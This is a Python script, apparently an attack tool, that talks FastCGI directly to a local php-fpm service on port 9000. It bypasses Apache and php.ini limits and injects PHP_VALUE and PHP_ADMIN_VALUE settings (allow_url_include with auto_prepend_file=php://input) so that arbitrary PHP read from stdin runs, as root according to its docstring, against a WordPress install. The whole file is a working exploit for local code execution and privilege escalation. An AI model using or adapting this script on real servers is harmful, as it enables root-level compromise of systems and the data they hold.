#!/usr/bin/env python3
"""
Minimal FastCGI client - sends a PHP request straight to php-fpm on
127.0.0.1:9000, bypassing Apache and its php.ini restrictions.

Because the pool runs with `user = root`, any PHP we get executed here
runs as root. `auto_prepend_file=php://input` + `allow_url_include=1`
makes php-fpm prepend the raw request body (STDIN) to the script, so we
never need an uploaded file on disk.
"""
import socket
import struct
import sys

FCGI_BEGIN_REQUEST = 1
FCGI_END_REQUEST = 3
FCGI_PARAMS = 4
FCGI_STDIN = 5
FCGI_STDOUT = 6
FCGI_STDERR = 7
FCGI_RESPONDER = 1


def record(rtype, req_id, body=b""):
    """Build one FastCGI record with correct padding."""
    pad = (-len(body)) % 8
    return struct.pack("!BBHHBB", 1, rtype, req_id, len(body), pad, 0) + body + b"\0" * pad


def nvpair(name, value):
    """Encode a FastCGI name-value pair (length-prefixed)."""
    n, v = name.encode(), value.encode()

    def enc(s):
        if len(s) < 128:
            return struct.pack("!B", len(s)) + s
        return struct.pack("!I", 0x80000000 | len(s)) + s

    return enc(n) + enc(v)


def main():
    php_code = sys.stdin.buffer.read()

    params = {
        "GATEWAY_INTERFACE": "FastCGI/1.0",
        "REQUEST_METHOD": "POST",
        "SCRIPT_FILENAME": "/var/www/wordpress/index.php",
        "SCRIPT_NAME": "/index.php",
        "REQUEST_URI": "/index.php",
        "DOCUMENT_ROOT": "/var/www/wordpress",
        "SERVER_SOFTWARE": "python-fcgi",
        "SERVER_NAME": "localhost",
        "SERVER_PORT": "80",
        "SERVER_PROTOCOL": "HTTP/1.1",
        "CONTENT_TYPE": "application/x-www-form-urlencoded",
        "CONTENT_LENGTH": str(len(php_code)),
        # Let the STDIN body be prepended and executed as PHP
        "PHP_VALUE": "allow_url_include = On\nauto_prepend_file = php://input\n"
                      "allow_url_fopen = On",
        "PHP_ADMIN_VALUE": "allow_url_include = On\nauto_prepend_file = php://input",
    }

    payload = b"".join(nvpair(k, v) for k, v in params.items())

    sock = socket.create_connection(("127.0.0.1", 9000), timeout=10)
    sock.sendall(
        record(FCGI_BEGIN_REQUEST, 1, struct.pack("!HB5x", FCGI_RESPONDER, 0))
        + record(FCGI_PARAMS, 1, payload)
        + record(FCGI_PARAMS, 1)          # empty record -> end of params
        + record(FCGI_STDIN, 1, php_code)
        + record(FCGI_STDIN, 1)           # empty record -> end of stdin
    )

    out, err, seen_end = b"", b"", False
    while True:
        header = sock.recv(8)
        if len(header) < 8:
            break
        _, rtype, _, clen, plen, _ = struct.unpack("!BBHHBB", header)
        body = b""
        while len(body) < clen:
            body += sock.recv(clen - len(body))
        if plen:
            sock.recv(plen)
        if rtype == FCGI_STDOUT:
            out += body
        elif rtype == FCGI_STDERR:
            err += body
        elif rtype == FCGI_END_REQUEST:
            seen_end = True
            break
    sock.close()

    sys.stdout.write(out.decode("utf-8", "replace"))
    if err:
        sys.stderr.write("\n[FCGI STDERR] " + err.decode("utf-8", "replace"))
    if not out and not seen_end:
        sys.stderr.write("\n[!] No response from php-fpm.\n")


if __name__ == "__main__":
    main()